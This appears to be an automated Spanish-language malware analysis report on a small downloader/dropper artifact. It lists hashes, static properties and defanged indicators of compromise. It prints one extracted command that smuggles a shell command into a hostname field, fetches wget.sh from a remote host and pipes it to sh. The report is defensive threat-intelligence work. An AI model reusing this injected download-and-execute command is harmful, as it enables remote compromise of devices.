# 🧬 Payload Analysis

`307e073f9ae90a4a38082bbbc101fe3be263b8a5bd71b1cc48790b60625469e7`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 319 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `307e073f9ae90a4a38082bbbc101fe3be263b8a5bd71b1cc48790b60625469e7`
- **MD5:** `0585171d6cee4ea93bc5328a1142bbc2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 319 B |
| Entropía | 5.1 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
hostname=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s russ;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s rus
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | hostname=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s russ;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s rus | strings |
| hash | 307e073f9ae90a4a38082bbbc101fe3be263b8a5bd71b1cc48790b60625469e7 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
